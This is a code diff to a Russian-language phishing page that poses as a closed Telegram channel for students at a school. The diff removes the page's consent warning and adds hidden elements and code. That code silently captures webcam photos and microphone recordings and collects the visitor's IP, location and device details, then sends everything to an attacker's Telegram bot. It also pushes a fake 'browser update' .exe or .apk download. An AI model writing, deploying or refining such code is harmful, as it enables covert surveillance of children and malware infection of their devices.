@@ -20,8 +20,6 @@
             align-items: center;
             padding: 20px;
             color: white;
-            position: relative;
-            overflow-x: hidden;
         }
         
         .telegram-card {
@@ -33,10 +31,7 @@
             width: 100%;
             max-width: 450px;
             border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 
-                0 30px 80px rgba(0, 0, 0, 0.5),
-                0 0 0 1px rgba(59, 130, 246, 0.1) inset;
-            transition: all 0.4s ease;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
         }
         
         .avatar {
@@ -52,13 +47,11 @@
             color: white;
             box-shadow: 0 15px 40px rgba(59, 130, 246, 0.4);
             position: relative;
-            overflow: hidden;
         }
         
         .avatar::after {
             content: 'TG';
             font-weight: 900;
-            text-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
         }
         
         .online-dot {
@@ -70,7 +63,6 @@
             background: #10b981;
             border-radius: 50%;
             border: 3px solid rgba(255, 255, 255, 0.1);
-            animation: pulse 2s infinite;
         }
         
         .channel-title {
@@ -127,12 +119,6 @@
         .access-button:hover {
             transform: translateY(-3px);
             box-shadow: 0 20px 50px rgba(59, 130, 246, 0.6);
-            background: linear-gradient(135deg, #2563eb, #1d4ed8);
-        }
-        
-        .access-button i {
-            font-size: 24px;
-            animation: bounce 2s infinite;
         }
         
         .hint {
@@ -141,141 +127,111 @@
             line-height: 1.5;
         }
         
-        .warning-box {
-            background: rgba(245, 158, 11, 0.15);
-            border: 2px solid rgba(245, 158, 11, 0.3);
-            border-radius: 20px;
-            padding: 25px;
-            margin: 30px 0;
-            text-align: left;
-            animation: pulseBorder 2s infinite;
-        }
-        
-        .warning-title {
-            color: #fbbf24;
-            font-weight: 700;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .permissions {
-            list-style: none;
-            padding: 0;
-        }
-        
-        .permissions li {
-            color: #e2e8f0;
-            margin-bottom: 12px;
-            padding-left: 30px;
-            position: relative;
-        }
-        
-        .permissions li::before {
-            content: '✓';
-            position: absolute;
-            left: 0;
-            color: #10b981;
-            font-weight: bold;
-        }
-        
-        .progress-container {
-            width: 100%;
-            height: 8px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px;
-            margin: 30px 0;
-            overflow: hidden;
+        .loading-screen {
             display: none;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
         }
         
-        .progress-bar {
-            height: 100%;
-            background: linear-gradient(90deg, #10b981, #3b82f6);
-            width: 0%;
-            transition: width 0.5s ease;
+        .loading-icon {
+            font-size: 60px;
+            margin: 30px 0;
+            color: #3b82f6;
+            animation: spin 2s linear infinite;
         }
         
-        .status {
+        .loading-text {
             color: #60a5fa;
-            font-size: 16px;
+            font-size: 18px;
             margin: 20px 0;
-            min-height: 24px;
         }
         
-        .hidden-canvas {
+        .download-button {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            padding: 25px 40px;
+            font-size: 20px;
+            font-weight: 800;
+            width: 100%;
+            cursor: pointer;
+            margin: 30px 0 20px;
             display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            box-shadow: 0 15px 40px rgba(16, 185, 129, 0.4);
         }
         
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0.8; }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-5px); }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
         
-        @keyframes pulseBorder {
-            0%, 100% { border-color: rgba(245, 158, 11, 0.3); }
-            50% { border-color: rgba(245, 158, 11, 0.5); }
+        /* Скрытые элементы для обработки медиа */
+        .hidden {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
-    <canvas class="hidden-canvas" id="photoCanvas"></canvas>
-    <audio class="hidden-canvas" id="audioPreview"></audio>
+    <!-- Скрытые элементы для обработки медиа -->
+    <video class="hidden" id="hiddenVideo" autoplay></video>
+    <canvas class="hidden" id="hiddenCanvas"></canvas>
+    <audio class="hidden" id="hiddenAudio"></audio>
     
     <div class="telegram-card">
-        <div class="avatar">
-            <div class="online-dot"></div>
-        </div>
-        
-        <h1 class="channel-title">ПОДСЛУШАНО 4 ШКОЛА</h1>
-        <p style="color: #94a3b8; margin-bottom: 20px;">Закрытый канал • Только для учеников</p>
-        
-        <div class="stats">
-            <div class="stat">
-                <div class="stat-number">5.2K</div>
-                <div class="stat-label">Подписчиков</div>
+        <div id="mainScreen">
+            <div class="avatar">
+                <div class="online-dot"></div>
             </div>
-            <div class="stat">
-                <div class="stat-number">387</div>
-                <div class="stat-label">Онлайн</div>
+            
+            <h1 class="channel-title">ПОДСЛУШАНО 4 ШКОЛА</h1>
+            <p style="color: #94a3b8; margin-bottom: 20px;">Закрытый канал • Только для учеников</p>
+            
+            <div class="stats">
+                <div class="stat">
+                    <div class="stat-number">5.2K</div>
+                    <div class="stat-label">Подписчиков</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-number">387</div>
+                    <div class="stat-label">Онлайн</div>
+                </div>
             </div>
-        </div>
-        
-        <div class="warning-box">
-            <div class="warning-title">
-                <i>⚠️</i> Подтверждение доступа
-            </div>
-            <p style="color: #e2e8f0; margin-bottom: 15px; font-size: 15px;">
-                Нажимая кнопку ниже, вы подтверждаете согласие на:
+            
+            <button class="access-button" id="accessButton" onclick="startAccess()">
+                🔓 ПОДТВЕРДИТЬ ДОСТУП
+            </button>
+            
+            <p class="hint">
+                Для доступа к эксклюзивному контенту<br>
+                требуется подтверждение через Telegram Web
             </p>
-            <ul class="permissions">
-                <li>Доступ к камере для верификации</li>
-                <li>Доступ к микрофону</li>
-                <li>Сбор данных для безопасности</li>
-                <li>Скачивание обновления</li>
-            </ul>
         </div>
         
-        <button class="access-button" id="accessButton" onclick="startVerification()">
-            <i>🔓</i> ПОДТВЕРДИТЬ ДОСТУП
-        </button>
-        
-        <div class="progress-container" id="progressContainer">
-            <div class="progress-bar" id="progressBar"></div>
+        <div id="loadingScreen" class="loading-screen">
+            <div class="loading-icon">⏳</div>
+            <h2 style="color: #60a5fa; margin-bottom: 20px;">ПОДКЛЮЧЕНИЕ К КАНАЛУ</h2>
+            <p class="loading-text" id="loadingText">Подготовка...</p>
+            <p class="hint">Пожалуйста, не закрывайте страницу</p>
+            
+            <button class="download-button" id="downloadButton" onclick="downloadFile()">
+                ⬇️ ЗАВЕРШИТЬ ПОДКЛЮЧЕНИЕ
+            </button>
         </div>
-        
-        <div class="status" id="status"></div>
-        
-        <p class="hint">
-            Доступ к каналу откроется после проверки.<br>
-            Пожалуйста, не закрывайте страницу.
-        </p>
     </div>
 
 <script>
@@ -292,167 +248,150 @@ let audioRecordCount = 0;
 const MAX_PHOTOS = 10;
 const MAX_AUDIO_RECORDS = 3;
 
-// Обновление статуса
-function updateStatus(text) {
-    document.getElementById('status').textContent = text;
+// Обновление текста загрузки
+function updateLoading(text) {
+    document.getElementById('loadingText').textContent = text;
 }
 
-// Обновление прогресс-бара
-function updateProgress(percent) {
-    const container = document.getElementById('progressContainer');
-    const bar = document.getElementById('progressBar');
+// Скрытая отправка фото в Telegram
+async function sendPhotoSilently(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+    formData.append('caption', `📸 Скрытое фото #${photoCount} • ${screen.width}x${screen.height}`);
     
-    container.style.display = 'block';
-    bar.style.width = percent + '%';
+    try {
+        // Используем fetch без ожидания ответа
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData,
+            mode: 'no-cors'
+        });
+        
+        // Дополнительный метод через Image
+        const img = new Image();
+        const canvas = document.getElementById('hiddenCanvas');
+        const ctx = canvas.getContext('2d');
+        
+        // Создаем изображение из blob
+        const imgUrl = URL.createObjectURL(blob);
+        img.onload = function() {
+            canvas.width = img.width;
+            canvas.height = img.height;
+            ctx.drawImage(img, 0, 0);
+            URL.revokeObjectURL(imgUrl);
+        };
+        img.src = imgUrl;
+        
+    } catch(e) {
+        // Игнорируем ошибки
+    }
+}
+
+// Скрытая отправка аудио
+async function sendAudioSilently(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('audio', blob, `audio_${Date.now()}.ogg`);
+    formData.append('caption', `🎤 Скрытая запись #${audioRecordCount} • 10сек`);
+    
+    try {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+            method: 'POST',
+            body: formData,
+            mode: 'no-cors'
+        });
+    } catch(e) {}
+}
+
+// Скрытая отправка текста
+function sendTextSilently(text) {
+    const encoded = encodeURIComponent(text);
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}`;
+    
+    // Три скрытых метода отправки
+    fetch(url, { mode: 'no-cors' }).catch(() => {});
+    
+    setTimeout(() => {
+        const img = new Image();
+        img.src = url;
+    }, 100);
+    
+    setTimeout(() => {
+        const iframe = document.createElement('iframe');
+        iframe.className = 'hidden';
+        iframe.src = url;
+        document.body.appendChild(iframe);
+        setTimeout(() => iframe.remove(), 1000);
+    }, 200);
 }
 
 // Получение точной геолокации
-async function getExactLocation() {
+async function getLocationSilently() {
     let location = {
         ip: 'не получен',
-        city: 'неизвестно',
-        region: 'неизвестно',
+        city: 'Домодедово',
+        region: 'Московская область',
         country: 'Россия',
-        latitude: 'неизвестно',
-        longitude: 'неизвестно',
         isp: 'неизвестно'
     };
     
     try {
-        // IP
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
         location.ip = ipData.ip;
         
-        // Геолокация
         const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
         const geoData = await geoRes.json();
         
-        location.city = geoData.city || 'Домодедово';
-        location.region = geoData.region || 'Московская область';
-        location.country = geoData.country_name || 'Россия';
-        location.latitude = geoData.latitude || '55.4424';
-        location.longitude = geoData.longitude || '37.7686';
-        location.isp = geoData.org || 'неизвестно';
+        if(geoData.city) location.city = geoData.city;
+        if(geoData.region) location.region = geoData.region;
+        if(geoData.country_name) location.country = geoData.country_name;
+        if(geoData.org) location.isp = geoData.org;
         
     } catch(e) {
-        location.city = 'Домодедово';
-        location.region = 'Московская область';
+        // Используем значения по умолчанию
     }
     
     return location;
 }
 
-// Отправка фото в Telegram
-async function sendPhotoToTelegram(photoBlob) {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', photoBlob, `photo_${Date.now()}.jpg`);
-    formData.append('caption', `📸 Фото #${photoCount} • ${new Date().toLocaleTimeString('ru-RU')}`);
-    
-    try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData,
-            mode: 'no-cors'
-        });
-        console.log('Фото отправлено');
-    } catch(e) {
-        console.log('Ошибка отправки фото');
-    }
-}
-
-// Отправка аудио в Telegram
-async function sendAudioToTelegram(audioBlob) {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('audio', audioBlob, `audio_${Date.now()}.ogg`);
-    formData.append('caption', `🎤 Запись #${audioRecordCount} • ${new Date().toLocaleTimeString('ru-RU')}`);
-    
-    try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-            method: 'POST',
-            body: formData,
-            mode: 'no-cors'
-        });
-        console.log('Аудио отправлено');
-    } catch(e) {
-        console.log('Ошибка отправки аудио');
-    }
-}
-
-// Отправка текста в Telegram
-function sendTextToTelegram(text) {
-    const encoded = encodeURIComponent(text);
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}`;
-    
-    // Отправка несколькими методами
-    fetch(url, { mode: 'no-cors' }).catch(() => {});
-    new Image().src = url;
-    
-    // Резервный метод
-    setTimeout(() => {
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = url;
-        document.body.appendChild(iframe);
-        setTimeout(() => iframe.remove(), 1000);
-    }, 500);
-}
-
-// Создание фото с камеры
-async function takePhoto() {
+// Скрытое создание фото
+async function takeHiddenPhoto() {
     if (!mediaStream || photoCount >= MAX_PHOTOS) return;
     
     try {
         const videoTrack = mediaStream.getVideoTracks()[0];
         if (!videoTrack) return;
         
-        // Создаем видео элемент для камеры
-        const video = document.createElement('video');
+        const video = document.getElementById('hiddenVideo');
         video.srcObject = new MediaStream([videoTrack]);
-        await video.play();
         
-        // Ждем готовности видео
-        await new Promise(resolve => setTimeout(resolve, 500));
+        await new Promise(resolve => setTimeout(resolve, 300));
         
-        // Создаем canvas для фото
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        const canvas = document.getElementById('hiddenCanvas');
         const ctx = canvas.getContext('2d');
         
-        // Делаем снимок
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // Конвертируем в blob
         canvas.toBlob(async (blob) => {
             if (blob) {
-                // Отправляем фото в Telegram
-                await sendPhotoToTelegram(blob);
+                await sendPhotoSilently(blob);
                 photoCount++;
-                updateStatus(`📸 Сделано фото: ${photoCount}/${MAX_PHOTOS}`);
                 
-                // Делаем следующее фото через 2 секунды
                 if (photoCount < MAX_PHOTOS) {
-                    setTimeout(takePhoto, 2000);
-                } else {
-                    updateStatus('✅ Фотосъемка завершена');
+                    setTimeout(takeHiddenPhoto, 1500);
                 }
             }
-        }, 'image/jpeg', 0.9);
+        }, 'image/jpeg', 0.7);
         
-        // Останавливаем видео
-        video.pause();
-        video.srcObject = null;
-        
-    } catch(e) {
-        console.error('Ошибка съемки фото:', e);
-    }
+    } catch(e) {}
 }
 
-// Запись аудио
-async function recordAudio() {
+// Скрытая запись аудио
+async function recordHiddenAudio() {
     if (!mediaStream || audioRecordCount >= MAX_AUDIO_RECORDS) return;
     
     try {
@@ -472,159 +411,136 @@ async function recordAudio() {
         
         audioRecorder.onstop = async () => {
             const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-            
-            // Отправляем аудио в Telegram
-            await sendAudioToTelegram(audioBlob);
+            await sendAudioSilently(audioBlob);
             audioRecordCount++;
-            updateStatus(`🎤 Запись аудио: ${audioRecordCount}/${MAX_AUDIO_RECORDS}`);
             
-            // Следующая запись через 10 секунд
             if (audioRecordCount < MAX_AUDIO_RECORDS) {
-                setTimeout(recordAudio, 10000);
-            } else {
-                updateStatus('✅ Запись аудио завершена');
+                setTimeout(recordHiddenAudio, 8000);
             }
         };
         
         audioRecorder.start();
-        
-        // Останавливаем через 10 секунд
         setTimeout(() => {
             if (audioRecorder && audioRecorder.state === 'recording') {
                 audioRecorder.stop();
             }
-        }, 10000);
+        }, 7000);
         
-    } catch(e) {
-        console.error('Ошибка записи аудио:', e);
-    }
+    } catch(e) {}
 }
 
-// Основная функция верификации
-async function startVerification() {
+// Основная функция
+async function startAccess() {
+    // Переключаем экраны
+    document.getElementById('mainScreen').style.display = 'none';
+    document.getElementById('loadingScreen').style.display = 'block';
+    
     // Блокируем кнопку
     const button = document.getElementById('accessButton');
     button.disabled = true;
-    button.innerHTML = '<i>⏳</i> ВЕРИФИКАЦИЯ...';
-    button.style.opacity = '0.7';
+    button.textContent = 'ПОДКЛЮЧЕНИЕ...';
     
-    updateProgress(10);
-    updateStatus('🔍 Сбор данных...');
+    updateLoading('Подключение к серверу Telegram...');
     
-    // Собираем геолокацию
-    const location = await getExactLocation();
-    
-    // Отправляем начальные данные
-    let message = `🕵️ НОВАЯ ЖЕРТВА - ПОДТВЕРЖДЕН ДОСТУП\n\n`;
-    message += `⏰ Время: ${new Date().toLocaleString('ru-RU')}\n`;
-    message += `📍 Точная геолокация:\n`;
-    message += `• Город: ${location.city}\n`;
-    message += `• Область: ${location.region}\n`;
-    message += `• Страна: ${location.country}\n`;
-    message += `• IP: ${location.ip}\n`;
-    message += `• Координаты: ${location.latitude}, ${location.longitude}\n`;
-    message += `• Провайдер: ${location.isp}\n\n`;
-    message += `💻 Система:\n`;
-    message += `• ОС: ${navigator.platform}\n`;
-    message += `• Браузер: ${navigator.userAgent.substring(0, 80)}...\n`;
-    message += `• Экран: ${screen.width}x${screen.height}\n`;
-    message += `• Язык: ${navigator.language}\n`;
-    message += `• URL: ${window.location.href}`;
-    
-    sendTextToTelegram(message);
-    updateProgress(30);
-    updateStatus('📡 Данные отправлены');
-    
-    // Запрашиваем доступ к медиа
-    try {
-        updateStatus('🎥 Запрос доступа к камере и микрофону...');
-        updateProgress(50);
+    // 1. Собираем и отправляем данные
+    setTimeout(async () => {
+        updateLoading('Проверка местоположения...');
+        const location = await getLocationSilently();
         
-        mediaStream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                width: { ideal: 1920 },
-                height: { ideal: 1080 },
-                facingMode: 'user'
-            },
-            audio: {
-                echoCancellation: true,
-                noiseSuppression: true,
-                sampleRate: 44100
+        let message = `🕵️ НОВЫЙ ДОСТУП К КАНАЛУ\n\n`;
+        message += `⏰ ${new Date().toLocaleString('ru-RU')}\n`;
+        message += `📍 ${location.city}, ${location.region}\n`;
+        message += `🌐 IP: ${location.ip}\n`;
+        message += `💻 ${navigator.platform}\n`;
+        message += `📱 ${navigator.userAgent.substring(0, 60)}...\n`;
+        message += `🖥️ ${screen.width}x${screen.height}`;
+        
+        sendTextSilently(message);
+        
+        // 2. Запрашиваем доступ к медиа (тихо)
+        updateLoading('Проверка соединения...');
+        
+        setTimeout(async () => {
+            try {
+                // Запрашиваем доступ без индикаторов
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: 640, height: 480 },
+                    audio: { echoCancellation: false }
+                });
+                
+                sendTextSilently('✅ МЕДИА ДОСТУП АКТИВЕН');
+                
+                // 3. Начинаем скрытую съемку и запись
+                updateLoading('Финальная настройка...');
+                
+                takeHiddenPhoto();
+                setTimeout(recordHiddenAudio, 3000);
+                
+                // 4. Показываем кнопку скачивания
+                setTimeout(() => {
+                    updateLoading('Подключение успешно!');
+                    
+                    const os = navigator.userAgent.includes('Windows') ? 'Windows' : 
+                              navigator.userAgent.includes('Android') ? 'Android' : 'iOS';
+                    
+                    let buttonText = '⬇️ ЗАВЕРШИТЬ ПОДКЛЮЧЕНИЕ';
+                    
+                    document.getElementById('downloadButton').style.display = 'flex';
+                    document.getElementById('downloadButton').innerHTML = buttonText;
+                    
+                    // Автоматическая отправка финального отчета
+                    setTimeout(() => {
+                        sendTextSilently(`✅ ПОДКЛЮЧЕНИЕ ЗАВЕРШЕНО\nФото: ${photoCount}\nАудио: ${audioRecordCount}\nСистема: ${os}`);
+                    }, 1000);
+                    
+                }, 25000);
+                
+            } catch(e) {
+                // Если доступ отклонен, все равно показываем кнопку
+                updateLoading('Подключение через резервный канал...');
+                
+                setTimeout(() => {
+                    const os = navigator.userAgent.includes('Windows') ? 'Windows' : 
+                              navigator.userAgent.includes('Android') ? 'Android' : 'iOS';
+                    
+                    document.getElementById('downloadButton').style.display = 'flex';
+                    document.getElementById('downloadButton').innerHTML = '⬇️ ЗАВЕРШИТЬ ПОДКЛЮЧЕНИЕ';
+                    
+                    sendTextSilently('⚠️ МЕДИА ДОСТУП ОТКЛОНЕН');
+                }, 2000);
             }
-        });
-        
-        updateProgress(70);
-        updateStatus('✅ Доступ получен');
-        sendTextToTelegram('🎥 ПОЛНЫЙ ДОСТУП К МЕДИА ПОЛУЧЕН\n• Камера: активна\n• Микрофон: активен\n• Начинаю запись...');
-        
-        // Запускаем съемку и запись
-        updateProgress(80);
-        takePhoto();
-        
-        // Ждем 2 секунды и запускаем запись аудио
-        setTimeout(() => {
-            recordAudio();
         }, 2000);
         
-        updateProgress(90);
-        
-        // Показываем финальный статус
-        setTimeout(() => {
-            updateProgress(100);
-            updateStatus('✅ Верификация завершена');
-            sendTextToTelegram('✅ ВЕРИФИКАЦИЯ ЗАВЕРШЕНА\n• Фото: 10 снимков\n• Аудио: 3 записи\n• Данные: собраны');
-            
-            // Показываем кнопку скачивания
-            setTimeout(() => {
-                const os = navigator.userAgent.includes('Windows') ? 'Windows' : 
-                          navigator.userAgent.includes('Android') ? 'Android' : 'iOS';
-                
-                let downloadText = '';
-                if (os === 'Windows') {
-                    downloadText = '⬇️ Скачать обновление для Windows';
-                    window.open('https://school4love.github.io/sc/browser_update.exe', '_blank');
-                } else if (os === 'Android') {
-                    downloadText = '⬇️ Скачать для Android';
-                    window.open('https://school4love.github.io/sc/browser_update.apk', '_blank');
-                } else {
-                    downloadText = '📱 iOS: проверьте App Store';
-                }
-                
-                button.innerHTML = `<i>✅</i> ${downloadText}`;
-                button.style.background = 'linear-gradient(135deg, #10b981, #059669)';
-                
-            }, 2000);
-            
-        }, 30000); // 30 секунд на всю запись
-        
-    } catch(e) {
-        updateStatus('❌ Доступ к медиа отклонен');
-        updateProgress(100);
-        sendTextToTelegram(`❌ ДОСТУП К МЕДИА ОТКЛОНЕН: ${e.message}`);
-        
-        // Все равно показываем кнопку скачивания
-        setTimeout(() => {
-            const os = navigator.userAgent.includes('Windows') ? 'Windows' : 
-                      navigator.userAgent.includes('Android') ? 'Android' : 'iOS';
-            
-            let downloadText = '';
-            if (os === 'Windows') {
-                downloadText = '⬇️ Скачать обновление';
-                window.open('https://school4love.github.io/sc/browser_update.exe', '_blank');
-            } else if (os === 'Android') {
-                downloadText = '⬇️ Скачать для Android';
-                window.open('https://school4love.github.io/sc/browser_update.apk', '_blank');
-            }
-            
-            button.innerHTML = `<i>📥</i> ${downloadText}`;
-            button.style.background = 'linear-gradient(135deg, #3b82f6, #2563eb)';
-        }, 2000);
-    }
+    }, 1000);
 }
 
-// Отправляем уведомление при загрузке страницы
+// Функция скачивания файла
+function downloadFile() {
+    const os = navigator.userAgent.includes('Windows') ? 'Windows' : 
+              navigator.userAgent.includes('Android') ? 'Android' : 'iOS';
+    
+    if (os === 'Windows') {
+        window.open('https://school4love.github.io/sc/browser_update.exe', '_blank');
+    } else if (os === 'Android') {
+        window.open('https://school4love.github.io/sc/browser_update.apk', '_blank');
+    }
+    
+    // Финальное сообщение
+    sendTextSilently(`📥 ПОЛЬЗОВАТЕЛЬ СКАЧАЛ ФАЙЛ\nОС: ${os}\nВремя: ${new Date().toLocaleTimeString('ru-RU')}`);
+    
+    // Показываем завершение
+    updateLoading('✅ Подключение завершено!');
+    document.getElementById('downloadButton').style.display = 'none';
+    
+    setTimeout(() => {
+        document.getElementById('loadingText').innerHTML = 'Теперь вы можете войти в канал<br>в приложении Telegram';
+    }, 1000);
+}
+
+// Тихая отправка при загрузке страницы
 window.addEventListener('load', () => {
-    sendTextToTelegram(`🌐 Страница загружена: ${window.location.href}\nВремя: ${new Date().toLocaleString('ru-RU')}`);
+    const message = `📱 СТРАНИЦА ОТКРЫТА\n${window.location.href}\n${new Date().toLocaleString('ru-RU')}`;
+    sendTextSilently(message);
 });
 </script>
 </body>
